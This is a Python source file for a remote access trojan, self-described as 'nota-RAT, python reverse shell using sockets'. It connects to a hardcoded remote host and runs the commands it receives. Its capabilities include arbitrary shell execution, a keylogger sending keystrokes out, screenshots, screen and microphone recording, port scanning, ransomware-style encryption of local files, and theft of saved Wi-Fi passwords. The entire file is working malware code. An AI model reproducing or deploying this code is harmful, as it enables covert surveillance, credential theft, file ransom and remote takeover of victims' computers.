import socket
import argparse
import os 
import time
import sys
import subprocess
import re
import numpy as np
import cv2
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write
import random
import datetime
from threading import Thread
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook, DiscordEmbed


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument("host", default= "xn--6pw65a019d.xyz", nargs="?", help="Address of the Server.")

parser.add_argument(
    "-p", "--port", default=421, help="Port the Server is running on.", type=int
)

args = parser.parse_args()
SERVER_HOST = args.host
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
keyz = Fernet.generate_key()
secret_key = keyz


''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command == "exit":
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        disconnected_msg = " disconnected quietly"
        disconnected_msg = f"\n{IPAddr}{disconnected_msg}"
        s.send(disconnected_msg.encode())
        break
    if command == "start local portscanner":
        port_range = s.recv(BUFFER_SIZE).decode()
        port_range = int(port_range)
        startTime = time.time()
        open_ports = 0
        ports_list = str()

        for i in range(0, port_range):
            hostname = socket.gethostname()
            host = "192.168.3.10"
            port = i
            timeout_seconds = 1
            port_scanner_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port_scanner_socket.settimeout(timeout_seconds)
            result = port_scanner_socket.connect_ex((host,int(port)))
            if result == 0:
                new_port =(f"\n[{INFO}] Host: {host}, Port: {port}{END}")
                ports_list = ports_list + new_port
            else:
                continue
            port_scanner_socket.close()
            open_ports += 1

        ports_list = str(ports_list)
        s.send(ports_list.encode())
        time.sleep(2)
        s.send((f"\n[{INFO}] Open ports: {END}" + str(open_ports)).encode())
        executionTime = (time.time() - startTime)
        executionTime = int(executionTime)
        time.sleep(2)
        s.send((f'[{INFO}] Execution time in seconds: ' + str(executionTime) + "\n").encode())
    if command == "start keylogger":
        LOGGER_HOST = args.host
        LOGGER_PORT = 422
        logger = socket.socket()
        logger.connect((LOGGER_HOST, LOGGER_PORT))
        def press(key):
            wordz = []
            wordz.append(key)
            with open("log.txt", "w") as file1:
                file1.writelines(f"\n{wordz}\n")
                
                
        def release(key):
            enc_key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
            if key == Key.space or Key.enter:
                with open("log.txt", "r") as file1:
                    contents = file1.read()
                    date_now = str(datetime.datetime.now())
                    contents = contents + date_now
                    logger.send(contents.encode())
        def keylogger_loop():
            while True:
                if command == "stop keylogger":
                    logger.close()
                    break
                with Listener(
                        on_press=press,
                        on_release=release) as listener:
                    listener.join()
        keyzlogger_loop = Thread(target=keylogger_loop)
        keyzlogger_loop.daemon = True
        keyzlogger_loop.start()
    if command == "take screenshot":
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image),
                     cv2.COLOR_RGB2BGR)
        cv2.imwrite("screenshot.png", image)
        filename = "screenshot.png"
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
        os.remove("screenshot.png")
    if command == "record screen":
        def screenrecorder():
            time_stop = s.recv(BUFFER_SIZE).decode()
            time_stop = int(time_stop)
            SCREEN_SIZE = (1920, 1080)
            fource = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('recording.mp4', fource, 10.0, (SCREEN_SIZE))

            fps = 20
            prev = 0

            start = time.time()

            while True:
                if time.time() > start + time_stop: 
                    cv2.destroyAllWindows()
                    out.release()
                    break
                time_elapsed = time.time()-prev
                img = pyautogui.screenshot()
                if time_elapsed > 1.0/fps:
                    prev = time.time()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    out.write(frame)
            filename = "recording.mp4"
            if filename in os.listdir():
                with open(filename, "rb") as f:
                    data = f.read()
                    dataLen = len(data)
                    s.send(dataLen.to_bytes(4,'big'))
                    s.send(data)
                f.close()
            os.remove("recording.mp4")
        screenrecorderz = Thread(target=screenrecorder)
        screenrecorderz.daemon = True
        screenrecorderz.start()
    if command == "send command":
        cwd = os.getcwd()
        s.send(cwd.encode())
        new_command = s.recv(BUFFER_SIZE).decode()
        splited_command = new_command.split()
        if splited_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        else:
            output = subprocess.getoutput(new_command)
        message = f"\r{GREEN}{output}{END}{SEPARATOR}{cwd}"
        s.send(message.encode())
    if command == "encrypt files":
        files = []
        for file in os.listdir():
            if file == "log.txt":
                continue
            if file == os.path.basename(__file__):
                continue
            if os.path.isfile(file):
                files.append(file)
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(keyz).encrypt(contents)
            with open(file, "wb")   as thefile:
                thefile.write(contents_encrypted)
        secret_key = keyz
        s.send("files encrypted successfully".encode())
    if command == "decrypt files":
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secret_key).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        s.send("files decrpyted successfully".encode())
    if command == "record mic":
        fs = 44100
        seconds = s.recv(BUFFER_SIZE).decode()
        seconds = int(seconds)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write('output.wav', fs, myrecording)
        filename = "output.wav"
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
        os.remove("output.wav")
    if command == "get wifi":
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

        wifi_list = []

        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profile = {}
                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile) 
        if wifi_list == []:
            s.send((f"[{IMPORTANT}] no wifi profiles found{END}").encode())   
        if wifi_list != []:
            for x in range(len(wifi_list)):
                s.send((f"[{IMPORTANT}] {wifi_list[x]}{END}").encode())
                
s.close()